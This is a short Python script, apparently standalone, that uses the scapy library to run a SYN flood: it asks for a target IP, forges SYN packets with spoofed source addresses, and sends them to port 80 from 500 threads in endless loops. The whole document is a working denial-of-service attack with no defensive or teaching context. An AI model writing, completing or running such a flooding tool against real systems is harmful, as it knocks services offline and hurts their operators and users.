from scapy.all import *
from random import getrandbits
import threading

target_ip = input("Enter target IP: ")
target_port = 80

def attack():
    ip = IP(src=RandIP(f'{target_ip}/24'), dst = target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=100)
    raw = Raw(b'Random data')
    syn_pack = ip/tcp/raw
    while True:
        send(syn_pack, verbose=0)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()